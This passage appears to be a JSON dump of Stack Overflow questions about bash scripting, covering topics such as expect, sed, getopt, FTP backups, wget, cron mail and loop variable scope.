saying \"why do you want to do that in the first case,\" it's really frustrating. I just want to know whether you can pipe information to <code>stdin</code> and then later prompt the user for input.</p>\n"},{"tags":["bash","title","gnu-screen","xterm"],"answer_count":6,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":3890,"score":7,"question_id":1687642,"title":"Set screen-title from shellscript","body":"<p>Is it possible to set the <code>Screen-Title</code> using a shell script?</p>\n\n<p>I thought about something like sending the key commands <code>Strg+A Shift-A Name &lt;Enter&gt;</code></p>\n\n<p>I searched for about an hour on how to emulate keystrokes in an shell script, but didn't find the answer.</p>\n\n<p>Thanks for Help!</p>\n\n<p>Beerweasle</p>\n"},{"tags":["linux","excel","bash","script"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":104,"score":0,"question_id":12942209,"title":"Script to convert an output into an Excel sheet","body":"<p>I have file which contains the following data:</p>\n\n<pre><code>-------------------[ server10 ]-------------------\nuser1\nuser2\nuser99\nuser100\n-------------------[ server20 ]-------------------\nuser1\nuser2\nuser10\nuser4\n-------------------[ server30 ]-------------------\nuser10\nuser30\nuser40\n</code></pre>\n\n<p>I want to convert this output into Excel sheet, so that I can present ti to my management. Any idea how can do that???  </p>\n\n<p>I want the output into the following format in the Excel sheet:</p>\n\n<pre><code>Hostname            users\nserver10            user1\n                    user2\n                    user99\n                    user100\nserver20            user2\n                    user10\n                    user4 \n...\n...\n</code></pre>\n\n<p>Till here \"David\" helped me with Python (openpyxl). but here i have new column (Last Logon time) which i want to add in excel so here is the example.</p>\n\n<pre><code>    -------------------[ server10 ]-------------------\n    user1\n    never\n    user2\n    Oct 17, 2011\n    user99\n    Jan 01, 2007\n    user100\n    Feb 02, 2010\n    -------------------[ server20 ]-------------------\n    user1\n    never\n    user2\n    never\n    user10\n    jul 17, 2001\n    user4\n    Dec 25, 1999\n    -------------------[ server30 ]-------------------\n    user10\n    Aug 10, 2012\n    user30\n    never\n    user40\n    never\n</code></pre>\n\n<p>In excel it would be like.</p>\n\n<pre><code> Hostname            users           Last logon\n    server10            user1            never\n                        user2            Oct 17, 2011\n                        user99           ...\n                        user100          ...\n    server20            user2\n                        user10\n                        user4 \n    ...\n    ...\n</code></pre>\n\n<p>Notes: username could be different here i gave you example userX but it would be spatel, jim, eric etc...</p>\n"},{"tags":["bash","getopt"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12982441,"title":"What is the purpose of 'set -- $args' after getopt?","body":"<p>The usual example for using getopt in bash is as follow</p>\n\n<pre><code>args=`getopt abo: $*`\nerrcode=$?\nset -- $args\n</code></pre>\n\n<p>What does that last line achieve?</p>\n"},{"tags":["bash","cygwin","root","sudo"],"answer_count":5,"favorite_count":3,"up_vote_count":12,"down_vote_count":0,"view_count":11773,"score":12,"question_id":4090301,"title":"Root user/sudo equivalent in Cygwin?","body":"<p>I'm trying to run a bash script in Cygwin.  </p>\n\n<p>I get <code>Must run as root, i.e. sudo ./scriptname</code> errors.  </p>\n\n<p><code>chmod 777 scriptname</code> does nothing to help.  </p>\n\n<p>I've looked for ways to imitate sudo on Cygwin, to add a root user, since calling \"su\" renders the error <code>su: user root does not exist</code>, anything useful, and have found nothing.  </p>\n\n<p>Anyone have any suggestions?</p>\n\n<p><strong>Edit</strong>: I thought I should close this off, since it's still getting so many views. Basically, as far as I have found through quite a bit of searching, there is no effective way at this point to run a script as a sudo user in Cygwin. I'm hoping it's added in a later version of Cygwin, but for now there's nothing out there.</p>\n\n<p><strong>Much Later Edit</strong>: <a href=\"http://stackoverflow.com/users/413884/adamthewebman\">AdamTheWebMan</a> recently posted an <a href=\"http://stackoverflow.com/a/11833077/470925\">answer</a> that looks quite promising involving <a href=\"https://github.com/nu774/sudo-for-cygwin\" rel=\"nofollow\">sudo-for-cygwin</a>. I haven't accepted because I haven't had a chance to really check it out yet. But I might. I might actually accept an answer after all this time.</p>\n"},{"tags":["bash","expect"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12981831,"title":"expect vs. bash read","body":"<p>I'm trying to use <code>expect</code> to talk to a <code>bash</code> script, but I'm missing something. My script is:</p>\n\n<pre><code>#!/bin/bash\necho -n \"foo? \"\nread\necho $REPLY\n</code></pre>\n\n<p>and my <code>expect</code> script is:</p>\n\n<pre><code>#!/usr/bin/expect\nspawn ./script.sh\nexpect \"foo? \"\nsend \"bar\\r\\n\"\n</code></pre>\n\n<p>But I never see <code>bar</code> when I run the <code>expect</code> script. What am I missing here?</p>\n"},{"tags":["bash","curl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":241,"score":0,"question_id":11135236,"title":"How can I branch a shell script based on an HTTP status code from curl?","body":"<p>I am writing a bash script for a backup.\nThe script is going to run a curl  and this is going to return a certain code.</p>\n\n<p>Depending on the result of this code:</p>\n\n<ul>\n<li>the script must continue running (if the return code is ok, like 200)\nor </li>\n<li>the script must return a not ok status (if the return code is not ok, like 400) and end the script without doing anything</li>\n</ul>\n\n<p>How can the return be read out from the curl ??\nSimple script for most of you but ... ;-)</p>\n"},{"tags":["linux","bash","shell","configuration","script"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12978898,"title":"Bash - Changing configuration file with sed","body":"<p>I've been having some problems with a shell script that changes a configuration file named \".backup.conf\".</p>\n\n<p>The configuration file looks like this:</p>\n\n<pre><code>inputdirs=(/etc /etc/apm /usr/local)\noutputdir=\"test_outputdir\"\nbackupmethod=\"test_outputmethod\"\nloglocation=\"test_loglocation\"`\n</code></pre>\n\n<p>My script needs to change one of the configuration file variables, and I've had no trouble with the last 3 variables.</p>\n\n<p>If I wanted to change variable \"inputdirs\" /etc/ to /etc/perl, what expression should I use?</p>\n\n<p>If I use echo with append, it will only append it to the end of the file.</p>\n\n<p>I've tried using sed in the following format:\n<code>sed -i 's/${inputdirs[$((izbor-1))]}/$novi/g' .backup.conf</code> where \"izbor\" is which variable I want to change from  inputdirs and \"novi\" is the new path (e.g. /etc/perl).</p>\n\n<p>So, with the following configuration file, and with variables <code>$izbor=1</code>and <code>$novi=/etc/perl</code> I should change the first variable <code>inputdirs=/etc</code> to <code>/etc/perl</code>\nand the variable inputdirs should finally look like <code>inputdirs=(/etc/perl /etc/apm /usr/local)</code></p>\n\n<p>Thank you for your help!</p>\n"},{"tags":["bash","variables","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12978621,"title":"passing variable to grep inside lookbehind group","body":"<p>i am trying to grep for an integer inside some text using a bash script:  </p>\n\n<pre><code>#!/bin/bash\nvar=string2    \ncat file.txt | grep -oP '(?&lt;=string1)(\\d.*)(&lt;=$var)'  \n</code></pre>\n\n<p>but the script outputs nothing.<br>\nif i put \"string2\" instead of \"$var\" i do get the expected result.<br>\ni guess i should escape the variable in some way, but i cant figure out how.<br>\ni tried double quotes, curly brackets, escaped double quotes, but nothing works.<br>\ni also searched stackoverflow man grep and google.<br>\nso what's the proper way to do that?<br>\nthanks</p>\n"},{"tags":["bash","ftp","backup","remote-server"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":12975588,"title":"Bash script to backup files to remote FTP. Deleting old files","body":"<p>I'm writing a bash script to send backups to a remote ftp server. The backup files are generated with a WordPress plugin so half the work is done for me from the start. </p>\n\n<p>The script does several things.</p>\n\n<ol>\n<li>It looks in the local backup dir for any files older than x and deletes them</li>\n<li>It connects to FTP and puts the backup files in a dir with the current date as a name</li>\n<li>It deletes any backup dirs for backups older than x</li>\n</ol>\n\n<p>As I am not fluent in bash, this is a mishmash of a bunch of scripts I found around the net. </p>\n\n<p>Here is my script: </p>\n\n<pre><code>#! /bin/bash \n\nBACKDIR=/var/www/wp-content/backups\n\n#----------------------FTP Settings--------------------#\n\nFTP=Y\n\nFTPHOST=\"host\"\nFTPUSER=\"user\"\nFTPPASS=\"pass\"\nFTPDIR=\"/backups\"\nLFTP=$(which lftp)      # Path to binary\n\n#-------------------Deletion Settings-------------------#\n\nDELETE=Y\n\nDAYS=3 # how many days of backups do you want to keep?\n\nTODAY=$(date --iso) # Today's date like YYYY-MM-DD\nRMDATE=$(date --iso -d  $DAYS' days ago') # TODAY minus X days - too old files\n\n#----------------------End of Settings------------------#\n\nif  [ -e $BACKDIR ]\nthen\n\nif  [ $DELETE = \"Y\" ]\nthen\n    find $BACKDIR -iname '*.zip' -type f -mtime +$DAYS -delete\n    echo \"Old files deleted.\"\nfi\n\nif  [ $FTP = \"Y\" ]\nthen\n\n    echo \"Initiating FTP connection...\"\n\n    cd $BACKDIR\n\n    $LFTP &lt;&lt; EOF\n    open ${FTPUSER}:${FTPPASS}@${FTPHOST}\n    mkdir $FTPDIR\n    cd $FTPDIR\n    mkdir ${TODAY}\n    cd ${TODAY}\n    mput *.zip\n    cd ..\n    rm -rf ${RMDATE}\n    bye\n\nEOF\n\necho \"Done putting files to FTP.\"\n\nfi\n\nelse\n    echo \"No Backup directory.\"\n    exit\nfi\n</code></pre>\n\n<p>There are 2 specific things I can't get done:</p>\n\n<ol>\n<li>The find command doesn't delete any of the old files in the local backup dir.</li>\n<li>I would like mput to only put the .zip files that were created today. </li>\n</ol>\n\n<p>Thanks in advance for the help.</p>\n"},{"tags":["windows","linux","gui","bash"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":431,"score":1,"question_id":2636233,"title":"GUI Application on Windows and Linux","body":"<p>I would like to export the Bash Shell Automation Script Project to a GUI Project which can run in both Windows and Linux. Which Programming Language would be better suited for this?</p>\n"},{"tags":["bash","sockets","daemon"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12976645,"title":"Linux daemon waiting for a socket connection","body":"<p>I would like to create a simple Linux daemon which will...</p>\n\n<ul>\n<li>open a tcp/ip server socket on localhost and specified port</li>\n<li>wait for a connection</li>\n<li>after someone connects, it will read the first line from the client's socket (ended by <code>\\n</code>)</li>\n<li>if the line is <code>foo</code>, it will run command <code>bar</code></li>\n<li>after the <code>bar</code> command is finished (or if the line wasn't <code>foo</code>), the daemon will wait for another connection and do the same (in infinite loop)...</li>\n</ul>\n\n<p>Is it possible to write this in bash? (And how?)</p>\n\n<p>Also, I would like to be able to start and stop the script with <code>service my-foobar-daemon start / stop</code> (on Ubuntu), how can I do that?</p>\n\n<p>Thanks :)</p>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12976625,"title":"Bash for loop syntax error with pipe","body":"<p>I'm trying this command</p>\n\n<pre><code>for x in qstat -u '*' | grep Eqw | awk {'print $1'}; do qmod -cj $x; done\n</code></pre>\n\n<p>and end up with this error:</p>\n\n<pre><code>-bash: syntax error near unexpected token `|'\n</code></pre>\n\n<p>I've tried wrapping my qstat command in various quotes and brackets to no avail, what am I doing wrong?</p>\n"},{"tags":["linux","debugging","bash"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":226,"score":2,"question_id":8261602,"title":"How can I debug the bash prompt?","body":"<p>I've been editing <code>.bashrc</code> files and other init files, and it seems that I've left behind a few code snippets or two that are causing a few errors at the prompt (e.g. file missing), but I can't find them.</p>\n\n<p>How do I debug the prompt to find out what init scripts I've carelessly hacked?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":12955253,"title":"Recursive wget won't work","body":"<p>I'm trying to crawl a local site with wget -r but I'm unsuccessful: it just downloads the first page and doesn't go any deeper. By the way, I'm so unsuccessful that for whatever site I'm trying it doesn't work... :)</p>\n\n<p>I've tried various options but nothing better happens. Here's the command I thought I'd make it with:</p>\n\n<pre><code>wget -r -e robots=off --user-agent=\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4\" --follow-tags=a,ref --debug `http://rocky:8081/obix`\n</code></pre>\n\n<p>Really, I've no clue. Whatever site or documentation I read about wget tells me that it should simply work with wget -r so I'm starting to think my wget is buggy (I'm on Fedora 16).</p>\n\n<p>Any idea?</p>\n\n<hr>\n\n<p><em>EDIT</em>: Here's the output I'm getting for <code>wget -r --follow-tags=ref,a http://rocky:8081/obix/</code> :</p>\n\n<blockquote>\n  <p>wget -r --follow-tags=ref,a <code>http://rocky:8081/obix/</code>\n  --2012-10-19 09:29:51--  <code>http://rocky:8081/obix/</code> Resolving rocky... 127.0.0.1 Connecting to rocky|127.0.0.1|:8081...\n  connected. HTTP request sent, awaiting response... 200 OK Length: 792\n  [text/xml] Saving to: “rocky:8081/obix/index.html”</p>\n  \n  <p>100%[==============================================================================>] 792         --.-K/s   in 0s      </p>\n  \n  <p>2012-10-19 09:29:51 (86,0 MB/s) - “rocky:8081/obix/index.html”\n  saved [792/792]</p>\n  \n  <p>FINISHED --2012-10-19 09:29:51-- Downloaded: 1 files, 792 in 0s (86,0\n  MB/s)</p>\n</blockquote>\n"},{"tags":["bash","ssh","script"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":945,"score":1,"question_id":5200865,"title":"script calls a script over ssh => bash: ... : No such file or directory","body":"<p>I run a script which calls another script through a ssh connection.</p>\n\n<p>My script executes the following command: </p>\n\n<pre><code>ssh $cluster \"bash $create 2 2 $parts\"\n</code></pre>\n\n<p>where <code>$cluster</code> is the ssh string and <code>$create</code> is the absolute path of the bash script on the target machine. I run <code>ssh $cluster \"mkdir $serialized/$number\"</code> a few lines earlier, which works just fine.</p>\n\n<p>However this command returns me: </p>\n\n<pre><code>bash: /data/.../create.bash 1 2 8: No such file or directory\n</code></pre>\n\n<p>The file is on the machine and I can execute the command there, but I can't figure out how to do it from within of a script over ssh. I tried different command, always receive this exception.</p>\n\n<p>Thanks for your help!</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":12857637,"title":"How to compare to directory names and enter the one that is the highest version","body":"<p>I have two version of tcpdump in the same subdirectory.</p>\n\n<p>tcpdump-4.1.1 and tcpdump-4.3.0</p>\n\n<p>How can I write a bash function to return the highest version?</p>\n\n<p><strong><em>Edit:</em></strong></p>\n\n<p>I've got it working now. Here's the code.</p>\n\n<pre><code>#!/bin/bash\n# Function to get the latest version of the directory\nfunction getLatestDirVer {\n    latestDIR=$(ls -v $1* | tail -n 1)\n    stringLen=`expr length \"$latestDIR\"`\n    stringLen=$(($stringLen-1))\n    latestDIR2=`expr substr $latestDIR 1 $stringLen`\n    echo $latestDIR2\n}\n\n# Main function\necho $(getLatestDirVer tcpdump)\n</code></pre>\n\n<p>Here's the ouptut</p>\n\n<pre><code>[luke@machine Desktop]$ ./latestDIRversion.sh \ntcpdump-4.3.0\n</code></pre>\n\n<p>The tcpdump-4.1.1 and tcpdump-4.3.0 directories are in the Desktop directory.</p>\n"},{"tags":["bash","md5sum"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12974837,"title":"md5sum for hadoop is different then md5sum on unix.","body":"<p>So when I run md5sum file on my unix system it is different then the md5sum I get when the same file is on hadoop. </p>\n\n<p>I created the file in unix then used:</p>\n\n<pre><code>hadoop dfs -comyFromLocal testfile testfile\n</code></pre>\n\n<p>to put the file on hadoop. \nTo get the md5sum I run:</p>\n\n<pre><code>hadoop jar $HADOOP_HOME/hadoop-streaming.jar -input $input -output $output -mapper /bin/cat -reducer /user/bin/md5sum\nhadoop dfs -copyToLocal $output $md5file\n</code></pre>\n\n<p>I am getting different md5sum for the same file. Any advice on what is going on here? </p>\n"},{"tags":["linux","bash","cron"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12973705,"title":"Cronjob using the mail function","body":"<p>When I run this mail command from the terminal, there's no problems:</p>\n\n<pre><code>mail -s \"Test Mail\" user@example.com &lt; home/user/example.txt\n</code></pre>\n\n<p>When I add it to a bash script that mainly does this, there's no problems:</p>\n\n<pre><code>tmpString=$(ssh user@server `perl -s` &lt; /home/user/perlscript.pl 2&gt; errorfile.txt)\nmail -s \"Test Mail\" user@example.com &lt; home/user/example.txt\n</code></pre>\n\n<p>But, when I create a crontab to run the bash script, the mail never gets sent:</p>\n\n<pre><code>10 14 * * * /home/user/mybashscript \n</code></pre>\n\n<p>However, I do recieve an email from cronjob about the output. The email with the subject \"Test Mail\" never arrives.</p>\n\n<p>Anyone had this issue before?</p>\n\n<p>The trace:</p>\n\n<p>Ok, I'll just change some of personal related naming. The mail should be sent before the last echo, but it's not showing up in the trace?</p>\n\n<pre><code>+ . /home/user/.bashrc\n++ PS1=`\\u@\\h \\w$`\n++ TERM=vt100\n++PATH=/usr/sbin:/usr/bin:/bin\n++ ssh user@example `perl -s`\n+ scriptString=`$VAR` = ``\\``Build was OK`\\``;`\n+echo `$VAR1`= ``\\``Build was OK`\\``;`\n$VAR1 = `Build was OK`;\n+ [[ $VAR1 = `Build was OK`; == *\\B\\u\\i\\l\\d\\ \\f\\a\\i\\l\\e\\d* ]]\n+ echo\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["regex","bash","shell","sed"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":222,"score":-6,"question_id":10472096,"title":"I'm trying to write a shell script to replace a few lines of text in a file with a new value","body":"<p>The rules would be:</p>\n\n<ul>\n<li>Delete all lines except the last line which contains: <strong><em>link</em></strong> and <strong><em>href=</em></strong></li>\n<li>Replace the contents of whatever is after: <strong><em>href=</em></strong> and before: <strong><em>.css</em></strong> with: <strong><em>hello-world</em></strong></li>\n<li>Must maintain no quotes, single quotes or double quotes around the file name</li>\n</ul>\n\n<p>A few examples:</p>\n\n<h3>This is a source file with quotes:</h3>\n\n<p><code>&lt;link rel=\"stylesheet\" href=\"css/reset.css\"&gt;</code><br>\n<code>&lt;link rel=\"stylesheet\" href=\"css/master.css\"&gt;</code></p>\n\n<h3>This is the new source file:</h3>\n\n<p><code>&lt;link rel=\"stylesheet\" href=\"hello-world.css\"&gt;</code></p>\n\n<h3>This is a source file without quotes:</h3>\n\n<p><code>&lt;link rel=stylesheet href=css/reset.css&gt;</code><br>\n<code>&lt;link rel=stylesheet href=css/master.css&gt;</code></p>\n\n<h3>This is the new source file:</h3>\n\n<p><code>&lt;link rel=stylesheet href=hello-world.css&gt;</code></p>\n\n<p>It does not need to maintain the path of the file name. It however cannot use &lt;> brackets or spaces to determine what needs to be edited because the template language which is writing that line might not use brackets or spaces. The only thing that would remain consistent is <em>href=[filename].css</em>.</p>\n\n<p>My bash/sed/regex skills are awful but those tools seem like they will probably get the job done in a decent way? How would I go about doing this?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>To clarify, the end result would leave everything above and below the lines that contain link and href= alone. Imagine that the source file was an html file or any other template file like so:</p>\n\n<pre><code>&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;Hello&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"css/reset.css\"&gt;\n    &lt;link rel=\"stylesheet\" href=\"css/master.css\"&gt;\n  &lt;/head&gt;\n\n  &lt;body&gt;&lt;p&gt;...&lt;/p&gt;&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>It would be changed to:</p>\n\n<pre><code>&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;Hello&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"css/hello-world.css\"&gt;\n  &lt;/head&gt;\n\n  &lt;body&gt;&lt;p&gt;...&lt;/p&gt;&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>The path of the CSS files might be anything too.</p>\n\n<pre><code>../foo/bar.css\nhttp://www.hello.com/static/css/hi.css\n/yep.css\nok.css\n</code></pre>\n\n<p>The new file's path would be supplied as an argument of the bash script so the regex should remove the path.</p>\n"},{"tags":["bash","grep"],"answer_count":2,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":171,"score":4,"question_id":9144448,"title":"Odd grep behavior","body":"<p>Motivated by <a href=\"http://stackoverflow.com/questions/9144090/interesting-grep-match-in-bash/9144139#comment11495596_9144139\"> this </a> question, can anyone explain the following behavior?</p>\n\n<pre>\n$ echo \"-uus\" | grep -wo '[0]&#42;' && echo matched\n-uus\n\nmatched\n$ echo \"-uus\" | grep -o '[0]&#42;' && echo matched\nmatched\n$ grep --version | sed 1q\ngrep (GNU grep) 2.5.1\n</pre>\n\n<p>In particular, why does the second grep succeed, but generate no output?  And why does the first command have two lines of output?  I can understand the second line of output, but I do not understand the first.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12971309,"title":"String manipulation, optional character","body":"<p>With <code>grep</code>, you can use a question mark <code>?</code> to signify an optional character, that is a character that is to be matches 0 or 1 times.</p>\n\n<pre><code>$ foo=qwerasdf\n\n$ grep -Eo fx? &lt;&lt;&lt; $foo\nf\n</code></pre>\n\n<p>The question is does Bash String Manipulation have a similar feature? Something like</p>\n\n<pre><code>$ echo ${foo%fx?}\n</code></pre>\n"},{"tags":["bash","shell","script","ftp","find"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":79,"score":2,"question_id":12760494,"title":"Find file and send it to ftp - SOLVED","body":"<p>I am new in bash scripting and I have to write a script that finds the newest .mpg file in directory and then sends it to a ftp server. So far I found command that find my file.</p>\n\n<pre><code>#! /bin/bash\n\nfind /home/user/directory -type f -mmin -50 -name *.mpg \\( ! -regex \".*/\\..*\" \\)\n</code></pre>\n\n<p>This works but I can't figure out how to send the output of that command to ftp server. I've read that I have to use variables, but I can't understand them so far.</p>\n"},{"tags":["bash","symlink"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12957016,"title":"Symbolic link catch user input","body":"<p>I want to create a symbolic link with the name <code>xyz</code>, and then catch the input the user gives including the symbolic link name. </p>\n\n<p>Example: If the user types: </p>\n\n<pre><code>xyz load aab\\1.0.5\n</code></pre>\n\n<p>I want to have <code>xyz load aab\\1.0.5</code> as a string that I can do more stuff with. </p>\n\n<p>Why do I ask? (things you can skip reading)</p>\n\n<p>In this case I will compare parts of this string with the names of directories and either</p>\n\n<ol>\n<li>give the user a warning if there is no match, or </li>\n<li>execute the command as it otherwise would.</li>\n</ol>\n\n<p>What I want to do is to hijack the <code>module</code> command.</p>\n\n<p>Edit: I suppose I should be using alias.</p>\n\n<p>Edit2: Clarification</p>\n\n<p>The exact thing I want to do is this: when a user types <code>module load program</code> or <code>module load program/2.3.3</code>. I don't want the command to execute before I know if the version they are requesting is available for the specific platform. I can check what versions are available by looking in the folder <code>/app/firefox/.sys/@sys/</code>.</p>\n\n<p>The underlying \"problem\" is that <code>module</code> is set up in a way that makes all modules available for SLES 10 and 11 and 32bit and 64bit so in some cases users try to load a version that is not available on their platform.</p>\n\n<p>I have now realized a problem: if they do not type version, then it will pick the default version. But I don't know how to easily find out the default version using a script. grepping <code>module appname avail</code> to get the version that has \"(default)\" in it does not work since it is something else then module that are printing the result. For example <code>module firefox avail &gt;&gt; result.text</code> gives an empty file.</p>\n"},{"tags":["java","linux","bash","unix","command-line"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":91,"score":2,"question_id":12970741,"title":"Executing Linux Command in Java","body":"<p>I'm trying to execute the following Command in Java in order to kill the spawned process of bash script which is executed through java : </p>\n\n<pre><code>kill $(pgrep -P $(pgrep -P 5537)) \n</code></pre>\n\n<p>I'm using apache Commons Exec Commandline to build the Command but it's no different to using ProcessBuilder here. So here is what I have so far:</p>\n\n<pre><code>CommandLine cmdLine = new CommandLine(\"bash\");\ncmdLine.addArgument(\"-c\");\ncmdLine.addArgument(\"kill $(pgrep -P $(pgrep -P \"+pid+\"))\");\n</code></pre>\n\n<p>I get the error</p>\n\n<pre><code>bash: $'kill 7940\\n7941\\n7942\\n7943': Command not found.\n</code></pre>\n\n<p>Normally I would now try to get the newlines out of the Command but it also doesn't work to kill just a single process because then I get the error :</p>\n\n<pre><code>bash: kill 7980: Command not found.\n</code></pre>\n\n<p>One the one hand I need to use bash to use the variables and on the other hand I can't use it because kill can't be executed with it...</p>\n"},{"tags":["regex","bash","file-extension"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12969479,"title":"Using regex in find command for multiple file types","body":"<p>I am currently using   </p>\n\n<pre><code>find . -name '*.[cCHh][cC]' -exec grep -nHr \"$1\" {} ; \\\nfind . -name '*.[cCHh]' -exec grep -nHr \"$1\" {} ;\n</code></pre>\n\n<p>to search for a string in all files ending with .c, .C, .h, .H, .cc and .CC listed in all subdirectories. But since this includes two commands this feels inefficient.</p>\n\n<p>How can I use a single regex pattern to find .c,.C,.h,.H,.cc and .CC files?</p>\n\n<p>I am using bash on a Linux machine.</p>\n"},{"tags":["mysql","bash","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12968715,"title":"MySQL import from stdin","body":"<p>I am generating a csv in stdout using awk. \nIs there a way to directly import that contents in mysql without putting it to file?</p>\n"},{"tags":["linux","bash","coredump","tcsh"],"answer_count":6,"favorite_count":25,"up_vote_count":43,"down_vote_count":0,"view_count":51575,"score":43,"question_id":17965,"title":"generate a core dump in linux","body":"<p>I have a process in linux that's getting a segmentation fault.  How can I tell it to generate a core dump when it fails?</p>\n"},{"tags":["regex","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":68,"score":2,"question_id":12962875,"title":"How to delete string between two HTML tags in one row using bash script","body":"<p>I have been working on some simple <code>bash</code> script recently, which parses specific data from webpages. I have used <code>tr '\\r\\n' ' ' &lt;file1.txt &gt;file2.txt</code> to make sure, all extracted data from page is stored in <code>file1.txt</code> in one row. So then I need to match all strings between <code>&lt;th&gt;...&lt;/th&gt;</code> tags in this line and delete them or replace with <code>' '</code> sign.\nSo here is some expamle code:</p>\n\n<pre><code>    &lt;td&gt;Abaktal hm&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;Package&lt;/th&gt; &lt;td&gt;flm 10x400 mg&lt;/td&gt; &lt;th&gt;Indesit&lt;/th&gt;\n</code></pre>\n\n<p>I have used <code>sed</code> and tried something like</p>\n\n<pre><code>    sed -i 's/\\&lt;th\\&gt;.*?\\&lt;\\/th\\&gt;/ /g' output.txt\n</code></pre>\n\n<p>But it didn't work. I think problem is in <code>?</code> sign. It works with <code>?</code> sign in regular expressions, but probably not in <code>bash</code>.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12967232,"title":"Repeatedly run a shell command until it fails?","body":"<p>I've written a <a href=\"http://en.wikipedia.org/wiki/Fuzz_testing\" rel=\"nofollow\">fuzzy</a> test that fails unreliably. I've added some debug code, but now I want to run the test until it fails so I can gather the debug output.</p>\n\n<p>I've setup the test so I can run it using:</p>\n\n<pre><code>./runtest\n</code></pre>\n\n<p>My current solution is to write an <code>untilfail</code> script:</p>\n\n<pre><code>#!/bin/bash\n$@\nwhile [ $? -eq 0 ]; do\n    $@\ndone\n</code></pre>\n\n<p>Then use it:</p>\n\n<pre><code>untilfail ./runtest\n</code></pre>\n\n<p>Is there a simpler solution?</p>\n"},{"tags":["bash","awk","solaris","nawk"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":12814676,"title":"nawk add column to each line","body":"<p>I am trying to add column with the name of the file into the end of each line.\nEvery line has a </p>\n\n<pre><code>Name Surname   some_number\n</code></pre>\n\n<p><code>Name</code> and <code>surname</code> are separated with space and <code>number</code> is separated from <code>Surname</code> by tab.</p>\n\n<p>I am doing it with this script but it does not work, it only adds filename to start of the line.</p>\n\n<pre><code>$1=temp\nnawk -v F'\\t' -v OFS='\\t' '{$2=$2\" \"$temp} 1' $temp\n</code></pre>\n\n<p>PS OS is SunOS.</p>\n"},{"tags":["bash","variables","escaping","user-input","forward-slash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12965857,"title":"How can I escape forward slashes in a user input variable in bash?","body":"<p>I'm working on a script to make setting up a Statamic site more efficient. The problem I'm running into is that the variable I'm using to replace a string in a file has unescaped forward slashes and is user input. How can I make sure that <code>_site_url: http://statamic.com</code> will become <code>_site_url: http://example.com</code>?</p>\n\n<p>The code below will work as long as there are no forward slashes present.</p>\n\n<pre><code>echo \"What's your site URL? Don't forget the protocol (ex. http://)!\"\nread -e SITE_URL\n\necho \"%s/_site_url: http:\\/\\/statamic.com/_site_url: $SITE_URL/g\nw\nq\n\" | ex _config/settings.yaml\n</code></pre>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":66,"score":2,"question_id":12819632,"title":"Why is a variable changed within a loop unchanged outside the loop","body":"<p>I use <code>command | awk '{ print $1; }' | while read val ; do</code> to loop through the command output. Recently I wanted to calculate the sum, and I discovered some strange behaviour in <code>bash</code>:</p>\n\n<p><strong>content of test.txt</strong></p>\n\n<pre><code>100\n200\n300\n</code></pre>\n\n<p><strong>content of test.sh</strong></p>\n\n<pre><code>sum='0'\ncat test.txt | awk '{ print $1; }' | while read val ; do\n        